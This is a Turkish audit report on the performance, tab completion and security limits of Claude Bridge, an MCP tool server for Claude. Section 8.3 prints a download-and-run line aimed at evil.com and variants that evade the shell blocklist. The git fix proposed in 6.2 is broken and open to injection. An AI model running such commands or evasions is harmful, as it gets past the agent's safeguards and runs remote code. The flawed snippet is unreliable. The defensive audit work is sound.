# Claude Bridge — Performans ve Tab Completion Denetim Raporu

## İçindekiler

1. [Tab Completion (Otomatik Tamamlama)](#1-tab-completion-otomatik-tamamlama)
2. [Terminal Bağlantı Yavaşlığı — Kök Neden Analizi](#2-terminal-bağlantı-yavaşlığı--kök-neden-analizi)
3. [İndeksleme Performansı](#3-İndeksleme-performansı)
4. [Relevance Sorgu Performansı](#4-relevance-sorgu-performansı)
5. [Disk I/O ve Dosya Sistemi Etkisi](#5-disk-io-ve-dosya-sistemi-etkisi)
6. [Git İşlemleri](#6-git-işlemleri)
7. [UX ve Kullanıcı Deneyimi](#7-ux-ve-kullanıcı-deneyimi)
8. [Güvenlik Sınırlamaları](#8-güvenlik-sınırlamaları)
9. [Kaynak Yönetimi ve Bellek](#9-kaynak-yönetimi-ve-bellek)
10. [Önceliklendirilmiş Uygulama Planı](#10-önceliklendirilmiş-uygulama-planı)

---

## 1. Tab Completion (Otomatik Tamamlama)

### 1.1 Sorun

Kullanıcı CLI'da bir şey yazarken **Tab** tuşuna bastığında, komut, parametre veya dosya yolu önerisi gelmiyor. Bu, UX'i ciddi şekilde olumsuz etkiler.

### 1.2 Mevcut Durum

Claude Bridge, CLI arayüzü için **Typer** kullanıyor (`cli.py`). Typer'in yerleşik shell completion desteği var ancak projede aktif olarak kullanılmıyor. Mevcut komutlar:

- `claude-bridge start`
- `claude-bridge version`
- `claude-bridge setup`
- `claude-bridge install`
- `claude-bridge benchmark`

### 1.3 Çözüm Seçenekleri

#### A. Typer Yerleşik Shell Completion (En Kolay, En Hızlı)

Typer, `app()` çağrıldığında otomatik olarak shell completion argümanlarını destekler. Kullanıcı tek seferlik şu komutu çalıştırır:

```bash
# Bash
eval "$(claude-bridge --install-completion bash)"

# Zsh
eval "$(claude-bridge --install-completion zsh)"

# Fish
claude-bridge --install-completion fish > ~/.config/fish/completions/claude-bridge.fish
```

Bu, her CLI komutu ve parametresi için otomatik tamamlama sağlar. **Kod değişikliği gerektirmez** — Typer bunu zaten destekliyor.

#### B. Parametre Seviyesinde Custom Autocomplete (Orta Zorluk)

Her tool parametresi için özelleştirilmiş tamamlama callback'leri yazılabilir:

```python
import typer

def complete_mode(ctx, args, incomplete):
    """run_workflow mode parametresi için tamamlama."""
    modes = ["review", "optimize", "orchestrate", "agent_loop", "quality", "test", "todo", "explain", "commit"]
    return [m for m in modes if m.startswith(incomplete)]

def complete_path(ctx, args, incomplete):
    """Proje içindeki dosya/klasör önerileri."""
    from pathlib import Path
    project_dir = Path.cwd()
    if incomplete:
        target = project_dir / incomplete
    else:
        target = project_dir
    try:
        return [str(p) for p in target.iterdir() if not p.name.startswith(".")]
    except OSError:
        return []
```

Bu callback'leri komutlara eklemek:

```python
@app.command()
def start(
    project_dir: Path = typer.Option(
        Path.cwd(),
        help="Root directory the bridge is allowed to access",
        shell_complete=complete_path,
    ),
    ...
):
```

#### C. MCP Protocol Üzerinden Autocomplete (İleri Seviye)

MCP protokolü doğrudan tab completion desteklemiyor, ancak yeni bir MCP tool eklenebilir:

```python
@mcp.tool(description="Suggest auto-completions for a partial input.")
async def autocomplete(
    partial_input: str,
    context: str = "command",
) -> str:
    """Kısmi girdiye dayalı öneriler döndür."""
    ...
```

Bu tool, Claude Desktop'ta kullanıldığında Claude mesaj yazarken öneri alabilir. Ancak bu, terminal CLI'daki Tab tuşu deneyimini **doğrudan** sağlamaz.

#### D. `readline` veya `prompt_toolkit` ile Telsiz Completion (Alternatif)

Eğer MCP server kendi stdin/stdout'unu yöneten bir terminal uygulaması ise, `prompt_toolkit` entegrasyonu ile zengin completion sağlanabilir:

```python
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import PathCompleter, WordCompleter

path_completer = PathCompleter()
command_completer = WordCompleter([
    "read_file", "list_directory", "run_shell",
    "patch_file", "write_file", "search_in_files",
    "index_codebase", "find_relevant_files",
])

session = PromptSession(completer=merge_completers([
    command_completer, path_completer
]))
```

**Ancak** Claude Bridge MCP stdio transport kullandığı için bu yaklaşım doğrudan uygulanamaz — stdin/stdout MCP protokolü için ayrılmış durumda.

### 1.4 Önerilen Yaklaşım

**Birleştirilmiş A + B:** Önce Typer'in yerleşik completion'ını aktif et (sıfır kod değişikliği), ardından parametre bazlı custom callback'leri ekle. Bu, en düşük eforla en yüksek UX iyileştirmesini sağlar.

---

## 2. Terminal Bağlantı Yavaşlığı — Kök Neden Analizi

### 2.1 Sorun

Claude Desktop terminal bağlantısında (veya CLI'dan MCP server başlatıldığında) server yavaş启动 ediyor. İlk tool çağrısı gelene kadar geçen süre belirgin şekilde uzun.

### 2.2 Kök Neden: Eager Import Chain

MCP server her spawn edildiğinde, `server.py` modül seviyesinde **tüm bağımlılıkları import ediyor.** Bu import zinciri:

```
mcp_server_noapproval.py (7 satır)
  └─ server.py (557 satır)
       ├─ config.py (96 satır)
       ├─ file_tools.py (808 satır) → git_ops.py, indexing.py, tool_utils.py
       ├─ shell_tools.py (262 satır)
       ├─ indexing.py (1012 satır) → pathspec, ast, re, threading, hashlib, json, os
       ├─ relevance.py (178 satır) → re, threading
       ├─ tool_utils.py (204 satır) → config.py, indexing.py
       ├─ git_ops.py (75 satır)
       ├─ workflow_tools.py (1335 satır) → workflow_presets.py, mcp.server.fastmcp.prompts
       ├─ workflow_presets.py (254 satır)
       └─ benchmarking.py (138 satır) → indexing.py, relevance.py
```

**Toplam: ~4900+ satır kod, 15+ modül, her spawn'ta yükleniyor.**

Dosya: `server.py:1-119`

```python
# Bu import'lar modül seviyesinde — her import'ta çalışıyor:
from claude_bridge.config import (apply_config, configure_from_env_state, current_config)
from claude_bridge.file_tools import (clear_last_bridge_change, list_directory, ...)
from claude_bridge.git_ops import git_commit, git_status_snapshot
from claude_bridge.indexing import (build_index, clear_index_cache, ...)
from claude_bridge.relevance import (query_terms, rank_indexed_files)
from claude_bridge.shell_tools import (analyze_shell_command, run_shell)
from claude_bridge.tool_utils import (current_allowed_roots, is_binary_bytes, ...)
from claude_bridge.workflow_tools import (build_context_pack, ...)
# ... toplam ~50 import satırı
```

### 2.3 Neden Sorun?

- `benchmarking.py`, `workflow_tools.py`, `workflow_presets.py` → **ilk tool çağrısına kadar gerekmiyor**
- `indexing.py`'deki 80+ regex pattern ve 13 dil extractor'ı → **sadece `index_codebase` ve `find_relevant_files` çağrıldığında gerekli**
- `relevance.py`'deki token scoring → **sadece `find_relevant_files` çağrıldığında gerekli**

### 2.4 Çözüm: Lazy Import

**Dosya:** `server.py`

Tüm import'ları fonksiyon/içerik seviyesine taşı:

```python
# server.py — YENİ YAKLAŞIM
"""MCP server implementation for Claude Bridge."""

from __future__ import annotations
from pathlib import Path
from typing import Any

from mcp.server.fastmcp import FastMCP
from claude_bridge.config import apply_config, configure_from_env_state, clear_index_cache

mcp = FastMCP("Claude Bridge")

def set_config(...) -> None:
    apply_config(...)
    from claude_bridge.file_tools import clear_last_bridge_change
    clear_last_bridge_change()

def _get_indexing():
    from claude_bridge.indexing import build_index, clear_index_cache
    return build_index, clear_index_cache

@mcp.tool(description="Find the most relevant files...")
async def find_relevant_files(query: str, path: str = ".", limit: int = 5) -> str:
    build_index, clear = _get_indexing()
    # ... kullan
```

**Bununla birlikte `cli.py`'deki `benchmarking` import'u da lazy yapılmalı:**

Dosya: `cli.py:15-17`

```python
# MEVCUT (eager — her claude-bridge çağrısında yüklenir):
from claude_bridge.benchmarking import run_index_and_relevance_benchmark
from claude_bridge.benchmarking import compare_benchmark_to_baseline
from claude_bridge.benchmarking import load_benchmark_profile

# ÇÖZÜM (lazy — sadece benchmark komutu çalıştırıldığında yüklenir):
# cli.py üst kısımdan KALDIR, benchmark fonksiyonunun içine taşı:
@app.command()
def benchmark(...):
    from claude_bridge.benchmarking import (
        run_index_and_relevance_benchmark,
        compare_benchmark_to_baseline,
        load_benchmark_profile,
    )
    ...
```

**Tahmini etki:** Startup süresi %40-60 azalır (benchmark, workflow, indexing modülleri ilk tool çağrısına kadar yüklenmez).

---

## 3. İndeksleme Performansı

### 3.1 Sorun: Aynı Dosya İçin 3 Kez `stat()` Çağrılması

**Dosya:** `indexing.py:680-702, 916-918, 610-616`

Aynı dosya için üç ayrı noktada `stat()` syscall yapılıyor:

```python
# 1. iter_source_files() içinde (satır 689-690):
for path in root.rglob("*"):
    if not path.is_file():    # ← stat() #1
        continue
    resolved_path = path.resolve()  # ← potansiyel stat() #2
    ...

# 2. build_index() snapshot oluşturma (satır 916-918):
snapshot = tuple(
    (file.relative_to(target).as_posix(), file.stat().st_mtime_ns)  # ← stat() #3
    for file in source_files
)

# 3. build_index() içinde _file_signature() (satır 940, 610-616):
def _file_signature(file: Path, root: Path) -> dict[str, Any]:
    stat = file.stat()  # ← stat() #4 — TEKRAR
    return {
        "relative_path": file.relative_to(root).as_posix(),
        "mtime_ns": stat.st_mtime_ns,
        "size": stat.st_size,
    }
```

100 dosyalı bir projede **400+ gereksiz stat() çağrısı.**

### 3.2 Çözüm: Tek Seferde Stat Toplama

`iter_source_files`'ın dönüş değerini zenginleştir:

```python
def iter_source_files_with_stat(
    root: Path,
    project_root: Path,
    *,
    is_within_root: Callable[[Path, Path], bool],
) -> list[tuple[Path, float, int]]:
    """Dosya listesi + (mtime_ns, size) tuple'ları döndür."""
    ...
    for path in root.rglob("*"):
        if not path.is_file():
            continue
        stat = path.stat()  # TEK SEFER
        resolved = path.resolve()
        ...
        files.append((path, stat.st_mtime_ns, stat.st_size))
    return sorted(files, key=lambda x: x[0])
```

`build_index`'de bu bilgileri doğrudan kullan:

```python
source_files_with_stat = iter_source_files_with_stat(target, project_root, ...)
snapshot = tuple(
    (f.relative_to(target).as_posix(), mtime_ns)
    for f, mtime_ns, size in source_files_with_stat
)
# Artık _file_signature'a gerek yok — zaten mtime_ns ve size elimizde
```

**Tahmini etki:** Index oluşturma ~3x hızlanır (özellikle ağ dosya sistemlerinde daha belirgin).

---

### 3.3 Sorun: Full Content Hafızada Tutulması

**Dosya:** `indexing.py:982, 965`

```python
entry = {
    "path": relative_path,
    "functions": symbols["functions"],
    "classes": symbols["classes"],
    "imports": symbols["imports"],
    "language": symbols["language"],
    "parser_backend": parser_backend,
    "content": source,  # ← TAM DOSYA İÇERİĞİ HAFIZADA
}
```

`public_index_payload` hariç tutuyor ama `rank_indexed_files` çağrıldığında full content hala payload'da.

**Dosya:** `indexing.py:997-1006` — disk cache'e de full content yazılıyor:

```python
payload = {
    "root": ...,
    "files": indexed_files,  # ← her biri "content" içeriyor
    "_file_cache": next_file_cache,  # ← burada da full content
}
_write_disk_cache(target, payload)  # ← diske de tam yazılıyor
```

**100 dosya × ortalama 5KB = 500KB RAM.** Büyük repolarda bu **GB seviyesine çıkabilir.**

### 3.4 Çözüm: Content Yerine Pre-Computed Token Saklama

```python
entry = {
    "path": relative_path,
    "functions": symbols["functions"],
    "classes": symbols["classes"],
    "imports": symbols["imports"],
    "language": symbols["language"],
    "parser_backend": parser_backend,
    "content_tokens": _tokenize_text(source),  # token seti — ~10x daha küçük
}
# _file_cache'te ise optional olarak full content tut
next_file_cache[relative_path] = {
    **signature,
    "functions": ...,
    "content": source,  # cache'te tut, ama payload'da tutma
}
```

**Tahmini etki:** Bellek kullanımı %70-90 azalır. Disk cache boyutu dramatik olarak küçülür.

---

## 4. Relevance Sorgu Performansı

### 4.1 Sorun: Her Query'de Her Dosyanın Token'ları Yeniden Hesaplanıyor

**Dosya:** `relevance.py:68-84`

```python
for item in index_payload["files"]:
    function_tokens = _tokenize_names(item["functions"])    # regex
    class_tokens = _tokenize_names(item["classes"])          # regex
    import_tokens = _tokenize_names(item["imports"])         # regex
    path_tokens = _tokenize_text(item["path"])               # regex
    content_tokens = _tokenize_text(item["content"])         # ← EN AĞIRI — full content tokenize
```

`_tokenize_text` her çağrıda:
1. CamelCase split (regex `(?<!^)(?=[A-Z])`)
2. Token split (regex `[^a-zA-Z0-9]+`)
3. Lower conversion
4. Set oluşturma

**100 dosya × 4 tokenize = 400 regex işlemi / query.** Cache miss durumunda her query bunları yeniden hesaplar.

**Dosya:** `relevance.py:21-33`

```python
def _tokenize_text(value: str) -> set[str]:
    stripped = value.strip()
    segmented = _CAMEL_CASE_PATTERN.sub(" ", stripped)          # regex #1
    direct_tokens = {token.lower() for token in _TOKEN_SPLIT_PATTERN.split(segmented) if token}  # regex #2
    expanded_tokens = set(direct_tokens)
    for token in _TOKEN_SPLIT_PATTERN.split(stripped):           # regex #3
        camel_parts = [part.lower() for part in _CAMEL_CASE_PATTERN.split(token) if part]  # regex #4
        expanded_tokens.update(camel_parts)
    return expanded_tokens
```

Tek bir dosyanın content'i için **4 regex işlemi.** 100 dosya = **400 regex işlemi.**

### 4.2 Çözüm: Index Oluştururken Pre-Compute

Index oluşturma aşamasında tüm token'ları bir kez hesaplayıp sakla:

```python
# indexing.py — build_index içinde:
from claude_bridge.relevance import _tokenize_text, _tokenize_names

entry = {
    "path": relative_path,
    "functions": symbols["functions"],
    "classes": symbols["classes"],
    "imports": symbols["imports"],
    "content_tokens": _tokenize_text(source),           # pre-computed
    "function_tokens": _tokenize_names(symbols["functions"]),  # pre-computed
    "class_tokens": _tokenize_names(symbols["classes"]),       # pre-computed
    "import_tokens": _tokenize_names(symbols["imports"]),      # pre-computed
    "path_tokens": _tokenize_text(relative_path),              # pre-computed
}
```

```python
# relevance.py — rank_indexed_files içinde:
for item in index_payload["files"]:
    function_tokens = item["function_tokens"]       # lookup — 0 regex
    class_tokens = item["class_tokens"]             # lookup — 0 regex
    import_tokens = item["import_tokens"]           # lookup — 0 regex
    path_tokens = item["path_tokens"]               # lookup — 0 regex
    content_tokens = item["content_tokens"]         # lookup — 0 regex
```

**Tahmini etki:** Query sırasında 400 regex işlemi → **0 regex işlemi.** Cache hit durumunda zaten 0 ama cache miss'te ~5-10x hızlanma.

### 4.3 Bonus: `haystacks` String Oluşturma Maliyeti

**Dosya:** `relevance.py:78-84`

```python
haystacks = {
    "path": item["path"].lower(),
    "functions": " ".join(name.lower() for name in functions),
    "classes": " ".join(name.lower() for name in classes),
    "imports": " ".join(name.lower() for name in imports),
    "content": item["content"].lower(),  # ← EN BÜYÜK — tüm dosya lowercase
}
```

`item["content"].lower()` → büyük bir dosyanın tüm içeriğini lowercase yapıyor, her query'de. Bu da pre-compute edilebilir.

```python
# Pre-compute (index sırasında):
entry["content_lower"] = source.lower()
entry["functions_lower"] = " ".join(name.lower() for name in symbols["functions"])
entry["classes_lower"] = " ".join(name.lower() for name in symbols["classes"])
entry["imports_lower"] = " ".join(name.lower() for name in symbols["imports"])
entry["path_lower"] = relative_path.lower()
```

---

## 5. Disk I/O ve Dosya Sistemi Etkisi

### 5.1 Sorun: `.gitignore` Her Seferinde Okunuyor

**Dosya:** `indexing.py:686-687, 713-714`

```python
# iter_source_files içinde:
patterns = read_gitignore_patterns(project_root)  # disk I/O — her çağrıda
spec = build_gitignore_spec(patterns)              # parsing — her çağrıda

# iter_searchable_files içinde:
patterns = read_gitignore_patterns(project_root)  # aynı şey tekrar
spec = build_gitignore_spec(patterns)
```

Aynı proje için `iter_source_files` ve `iter_searchable_files` sırayla çağrıldığında, `.gitignore` **iki kez** okunuyor ve parse ediliyor.

### 5.2 Çözüm: Mtime-Based `.gitignore` Cache

```python
_GITIGNORE_CACHE: dict[str, tuple[float, list[str]]] = {}

def read_gitignore_patterns_cached(project_root: Path) -> list[str]:
    key = str(project_root.resolve())
    gitignore = project_root / ".gitignore"
    mtime = gitignore.stat().st_mtime if gitignore.exists() else 0.0

    cached_mtime, cached_patterns = _GITIGNORE_CACHE.get(key, (0.0, []))
    if cached_mtime == mtime:
        return cached_patterns

    patterns = read_gitignore_patterns(project_root)  # gerçek okuma
    _GITIGNORE_CACHE[key] = (mtime, patterns)
    return patterns
```

### 5.3 Sorun: `rglob("*")` ile Gereksiz Dizin Taraması

**Dosya:** `indexing.py:689`

```python
for path in root.rglob("*"):
    if any(part in _SKIP_DIRS for part in path.parts):
        continue
```

`node_modules/` veya `.venv/` içindeki 10,000+ dosya **rglob tarafından üretilip sonra filtreleniyor.** Her dosya için `is_file()`, `resolve()`, ve karşılaştırma yapılıyor.

### 5.4 Çözüm: `os.walk` ile Dizin Seviyesinde Kısa Devre

```python
def iter_source_files_fast(root: Path, project_root: Path, ...) -> list[Path]:
    patterns = read_gitignore_patterns_cached(project_root)
    spec = build_gitignore_spec(patterns)
    files: list[Path] = []

    for dirpath, dirnames, filenames in os.walk(root):
        # Alt dizinleri yerinde filtrele — rglob'a gerek kalmaz
        dirnames[:] = [
            d for d in dirnames
            if d not in _SKIP_DIRS
            and not is_ignored(Path(dirpath) / d, root, project_root, patterns, spec)
        ]

        for filename in filenames:
            path = Path(dirpath) / filename
            if path.suffix not in _INDEXABLE_SUFFIXES:
                continue
            if is_ignored(path, root, project_root, patterns, spec):
                continue
            files.append(path)

    return sorted(files)
```

**Tahmini etki:** `node_modules` veya `.venv` içeren repolarda tarama **%90+ azalır.**

---

## 6. Git İşlemleri

### 6.1 Sorun: Her Dosya Değişikliğinde 3-4 Ayrı Subprocess Çağrısı

**Dosya:** `git_ops.py:10-60`

`git_commit()` her çağrıldığında **ardışık 3-4 subprocess başlatıyor:**

```python
# 1. repo root bul:
top_level = subprocess.run(["git", "rev-parse", "--show-toplevel"], ...)  # subprocess #1

# 2. (opsiyonel) git init:
init = subprocess.run(["git", "init"], ...)  # subprocess #2

# 3. dosyayı ekle:
add = subprocess.run(["git", "add", relative_file], ...)  # subprocess #3

# 4. commit yap:
commit = subprocess.run(["git", "commit", "-m", message], ...)  # subprocess #4
```

`write_file`, `patch_file`, ve `undo_last_patch`'in her biri `git_commit` çağırıyor. Claude bir oturumda 10 patch yaparsa → **30-40 subprocess lansı.** Her subprocess fork + exec = ~5-10ms. Toplam: **150-400ms sadece git işlemleri.**

Ayrıca `rev-parse --show-toplevel` her seferinde aynı sonucu döndürür (repo root değişmez) ama her seferinde tekrar sorgulanıyor.

### 6.2 Çözüm: Repo Root Cache ve Batch Git İşlemleri

```python
_REPO_ROOT_CACHE: dict[str, Path] = {}

def _get_repo_root(project_dir: Path) -> Path:
    key = str(project_dir.resolve())
    if key in _REPO_ROOT_CACHE:
        return _REPO_ROOT_CACHE[key]
    result = subprocess.run(["git", "rev-parse", "--show-toplevel"], ...)
    if result.returncode == 0:
        root = Path(result.stdout.strip()).resolve()
        _REPO_ROOT_CACHE[key] = root
        return root
    _REPO_ROOT_CACHE[key] = project_dir
    return project_dir

def git_commit(file_path: str, *, project_dir: Path, message: str | None = None) -> dict[str, Any]:
    repo_root = _get_repo_root(project_dir)  # cache'den oku — 0 subprocess

    # add + commit tek bir shell çağrısında birleştirilebilir:
    result = subprocess.run(
        ["git", "add", relative_file, "&&", "git", "commit", "-m", message or f"bridge: update {relative_file}"],
        shell=True,
        capture_output=True,
        text=True,
        cwd=repo_root,
    )
```

**Tahmini etki:** Her commit 4 subprocess → 1 subprocess. Repo root cache ile ilk sefer hariç 0 subprocess.

---

### 6.3 Sorun: `write_file` ve `patch_file` Otomatik Commit Yapıyor — Batch İmkanı Yok

**Dosya:** `file_tools.py:393-396, 628-631`

```python
# write_file sonunda:
git_result = git_commit_fn(
    target.relative_to(target_project_dir).as_posix(),
    project_dir=target_project_dir,
)

# patch_file sonunda:
git_result = git_commit_fn(
    target.relative_to(target_project_dir).as_posix(),
    project_dir=target_project_dir,
)
```

Claude bir oturumda 10 dosya değiştirirse, her biri ayrı bir commit oluşturur. Git geçmişi **gereksiz şekilde parçalanır.**

### 6.4 Çözüm: Opsiyonel Commit ve Batch Modu

```python
@mcp.tool(description="Apply a SEARCH/REPLACE patch to a file.")
async def patch_file(
    file: str,
    search: str,
    replace: str,
    auto_commit: bool = True,  # yeni parametre
) -> str:
    ...
    if auto_commit:
        git_result = git_commit_fn(...)
    else:
        git_result = {"commit": False, "output": "Skipped by user"}

@mcp.tool(description="Stage and commit all pending bridge changes.")
async def commit_changes(message: str = None) -> str:
    """Biriken değişiklikleri tek bir commit'te toplu halde commit et."""
    ...
```

**Tahmini etki:** Kullanıcı değişiklikleri gruplayabilir, gereksiz commit'lerden kaçınır, git geçmişi temiz kalır.

---

## 7. UX ve Kullanıcı Deneyimi

### 7.1 Sorun: Prompt Kaydı Modül Seviyesinde Gerçekleşiyor

**Dosya:** `server.py:557`

```python
_register_prompts()  # ← modül yüklemesi sırasında çalışıyor
```

Bu çağrı, `server.py` import edildiği anda 9 prompt tanımını MCP'ye kaydeder. Bu, startup süresini artıran bir başka eager initialization.

**Dosya:** `workflow_tools.py:1221-1335` — `_register_prompts` fonksiyonu 9 adet `Prompt` nesnesi oluşturuyor, her biri bir lambda ve parametre listesi içeriyor.

### 7.2 Çözüm: Prompt Kaydını İlk Tool Çağrısına Ertele veya Lazy Yap

```python
# server.py — modül seviyesinde çalıştırma:
# _register_prompts()  ← KALDIR

# Yerine, run_mcp_server içinde:
def run_mcp_server() -> None:
    from claude_bridge.workflow_tools import register_prompts
    register_prompts(mcp)
    mcp.run(transport="stdio")
```

### 7.3 Sorun: Uzun Süren İşlemlerde İlerleme Göstergesi Yok

Index oluşturma, arama ve workflow işlemleri büyük repolarda saniyeler sürebilir. Kullanıcı herhangi bir ilerleme görmüyor — sadece bekliyor.

### 7.4 Çözüm: Progress Callback veya Loglama

```python
def build_index(path: str, *, on_progress: Callable[[str, int, int], None] = None, ...) -> dict:
    ...
    for i, file in enumerate(source_files):
        if on_progress:
            on_progress(f"Indexing {file.name}", i, len(source_files))
        ...
```

Claude Desktop MCP'sinde doğrudan progress göstermek mümkün olmayabilir ancak stderr'e log yazılabilir:

```python
import sys

for i, file in enumerate(source_files):
    print(f"\r[indexing] {i}/{len(source_files)} {file.name}", file=sys.stderr, end="", flush=True)
```

### 7.5 Sorun: Shell Timeout 30 Saniye — Bazı İşlemler İçin Çok Kısa

**Dosya:** `config.py:15` ve `tool_utils.py:203`

```python
shell_timeout: int = 30  # varsayılan
```

`npm install`, `cargo build`, `go test ./...` gibi işlemler 30 saniyeyi kolayca aşar.

### 7.6 Çözüm: Komut Bazlı Timeout veya Timeout Override

```python
@mcp.tool(description="Run a non-interactive shell command with approval.")
async def run_shell(command: str, timeout: int = None) -> str:
    timeout_seconds = timeout or _shell_timeout()  # komut bazlı override
    ...
```

Veya otomatik timeout artırma:

```python
_LONG_RUNNING_COMMANDS = {"npm install", "npm ci", "cargo build", "cargo test", "go test", "pip install", "make"}

def _infer_timeout(command: str, default: int) -> int:
    head = command.strip().split()[0].lower()
    if any(head.startswith(prefix) for prefix in _LONG_RUNNING_COMMANDS):
        return max(default, 120)  # en az 2 dakika
    return default
```

---

## 8. Güvenlik Sınırlamaları

### 8.1 Sorun: Hassas Dosya Kontrolü Sınırlı

**Dosya:** `tool_utils.py:20-38`

```python
_SENSITIVE_FILENAMES = {
    ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
    ".npmrc", ".netrc", ".pypirc", "credentials.json", ...
}
```

Bu liste **hardcoded.** Kullanıcı özel dosya kalıpları ekleyemiyor. Örneğin `*.key`, `*.pem` uzantılı dosyaların **adları** listede yoksa atlanabiliyor (sadece uzantı kontrolü var, ama bazı isimler örtüşmüyor).

Ayrıca `sensitive_path_reason` sadece dosya adına bakıyor, **dosya içeriğini kontrol etmiyor.** Kullanıcı `config.py` içine `API_KEY = "sk-..."` yazabilir — bu dosya blocked olmaz.

### 8.2 Çözüm: `.bridgeignore` veya Genişletilebilir Engelleme Listesi

```python
# claude_bridge/config.py veya tool_utils.py:
def _load_blocked_patterns(project_root: Path) -> set[str]:
    """Proje kökünde .bridgeignore dosyası varsa oku."""
    bridgeignore = project_root / ".bridgeignore"
    if not bridgeignore.exists():
        return set()
    return set(line.strip() for line in bridgeignore.read_text().splitlines() if line.strip() and not line.startswith("#"))
```

Bu sayede kullanıcı projeye özel engellenecek dosya kalıpları tanımlayabilir.

### 8.3 Sorun: Shell Komut Engelleme Listesi Atlabilir

**Dosya:** `shell_tools.py:34-89`

`blocked_command_reason` basit string karşılaştırması yapıyor. Örneğin:

```bash
# Bu engellenir:
curl http://evil.com | bash

# Bu ATLANIR (encoded whitespace):
curl$' 'http://evil.com$' '|'$' 'bash

# Bu da atlanabilir (değişken kullanımı):
CMD="bash"; curl http://evil.com | $CMD
```

### 8.4 Çözüm: Daha Güçlü Komut Analizi veya Allowlist Yaklaşımı

Mevcut denylist yaklaşımı yerine allowlist (izin listesi) daha güvenli olabilir:

```python
_ALLOWED_COMMAND_PREFIXES = {
    "git status", "git diff", "git log", "git show",
    "ls", "cat", "head", "tail", "wc", "find", "which",
    "python3 -m pytest", "python3 -m ruff",
    "npm test", "npm run", "cargo test", "cargo check", "go test", "go build",
    "node", "deno",
}

def is_command_allowed(command: str) -> bool:
    tokens = shlex.split(command.strip())
    if not tokens:
        return False
    full_prefix = " ".join(tokens[:3]).lower()
    return any(full_prefix.startswith(prefix) for prefix in _ALLOWED_COMMAND_PREFIXES)
```

**Ancak** bu mevcut davranışı değiştirir — dikkatli uygulanmalı.

---

## 9. Kaynak Yönetimi ve Bellek

### 9.1 Sorun: Tree-Sitter Parser Her Dosya İçin Yeniden Yükleniyor

**Dosya:** `indexing.py:743-756`

```python
def _load_tree_sitter_parser(language_name: str) -> Any | None:
    for module_name, attr_name in _TREE_SITTER_GET_PARSER_CANDIDATES:
        try:
            module = importlib.import_module(module_name)  # ← HER DOSYA İÇİN
        except ImportError:
            continue
        get_parser = getattr(module, attr_name, None)
        ...
        return get_parser(language_name)
```

Bu fonksiyon `_extract_tree_sitter_symbols` tarafından her dosya için çağrılıyor. Python `import_module` ilk başarılı import'tan sonra cached module döndürür, ama try/except + getattr hala her dosya için çalışır.

100 dosyalı projede → **100× try/except + getattr.**

### 9.2 Çözüm: Parser Cache

```python
_TREE_SITTER_PARSER_CACHE: dict[str, Any] = {}

def _load_tree_sitter_parser(language_name: str) -> Any | None:
    if language_name in _TREE_SITTER_PARSER_CACHE:
        return _TREE_SITTER_PARSER_CACHE[language_name]

    parser = None
    for module_name, attr_name in _TREE_SITTER_GET_PARSER_CANDIDATES:
        try:
            module = importlib.import_module(module_name)
        except ImportError:
            continue
        get_parser = getattr(module, attr_name, None)
        if get_parser is None:
            continue
        try:
            parser = get_parser(language_name)
            break
        except Exception:
            continue

    _TREE_SITTER_PARSER_CACHE[language_name] = parser  # None da cache'le (tekrar deneme)
    return parser
```

### 9.3 Sorun: Disk Cache'e Full Content Yazılıyor — Devasa JSON Dosyaları

**Dosya:** `indexing.py:571-578`

```python
def _write_disk_cache(target: Path, payload: dict[str, Any]) -> None:
    ...
    cache_path.write_text(
        json.dumps({"version": _DISK_CACHE_VERSION, "payload": payload}, ensure_ascii=False),
        encoding="utf-8",
    )
```

`payload` içindeki `_file_cache`, **tüm dosyaların full content'ini** içeriyor. 100 dosyalı projede bu cache dosyası **~500KB-5MB** arasında olabilir. 1000 dosyalı projede **50MB+**.

Cache miss durumunda bu dosya **okunup parse ediliyor** (`_load_disk_cache`).

### 9.4 Çözüm: Disk Cache'den Content'i Hariç Tut

```python
def _write_disk_cache(target: Path, payload: dict[str, Any]) -> None:
    # Disk cache'e yazarken _file_cache ve content'i çıkar
    lightweight_payload = {
        key: value for key, value in payload.items()
        if not key.startswith("_")
    }
    lightweight_payload["files"] = [
        {k: v for k, v in item.items() if k != "content"}
        for item in payload["files"]
    ]
    ...
```

Disk cache sadece sembol bilgisi saklasın, full content gerektiğinde dosyadan okunsun. Cache hit sonrası değişmemiş dosyalar için `file.read_text()` zaten mevcut — ekstra bir maliyet yok.

### 9.5 Sorun: `iter_searchable_files` Her Dosyanın Tüm İçeriğini Binary Kontrolü İçin Okuyor

**Dosya:** `indexing.py:729-733`

```python
try:
    raw = path.read_bytes()  # ← TAM DOSYAYI BYTES OLARAK OKU
except OSError:
    continue
if len(raw) > _MAX_SEARCH_FILE_BYTES or is_binary_bytes(raw):
    continue
```

512KB'lık bir dosya, **binary olup olmadığını kontrol etmek için tamamen okunuyor.** `is_binary_bytes` ise sadece `b"\x00"` arıyor — tek bir byte için tüm dosyayı okumak gereksiz.

### 9.6 Çözüm: İlk N Byte'ı Kontrol Et

```python
_BINARY_CHECK_BYTES = 8192  # 8KB yeterli

def is_likely_binary(path: Path) -> bool:
    """Dosyanın ilk birkaç KB'ını okuyarak binary olup olmadığını kontrol et."""
    try:
        with open(path, "rb") as f:
            header = f.read(_BINARY_CHECK_BYTES)
        return b"\x00" in header or len(header) == 0
    except OSError:
        return True

def iter_searchable_files(...):
    for path in ...:
        ...
        try:
            stat = path.stat()
        except OSError:
            continue
        if stat.st_size > _MAX_SEARCH_FILE_BYTES:
            continue
        if is_likely_binary(path):
            continue
        files.append(path)
```

**Tahmini etki:** 512KB'lık dosya için 512KB okuma → 8KB okuma. **~64x I/O azalması.**

### 9.7 Sorun: `_iter_tree_sitter_nodes` Özyinelemeli — Derin AST Ağaçlarında Stack Overflow Riski

**Dosya:** `indexing.py:759-764`

```python
def _iter_tree_sitter_nodes(node: Any) -> list[Any]:
    nodes = [node]
    children = getattr(node, "children", None) or []
    for child in children:
        nodes.extend(_iter_tree_sitter_nodes(child))  # ← özyinelemeli
    return nodes
```

Çok büyük dosyalarda (ör. minified JS, generated code) bu fonksiyon **derin özyineleme** yapabilir. Python'un varsayılan recursion limit'i 1000 — büyük AST'ler buna ulaşabilir.

### 9.8 Çözüm: Yığıt (Stack) Tabanlı Geçiş

```python
def _iter_tree_sitter_nodes(node: Any) -> list[Any]:
    nodes = []
    stack = [node]
    while stack:
        current = stack.pop()
        nodes.append(current)
        children = getattr(current, "children", None) or []
        stack.extend(reversed(children))
    return nodes
```

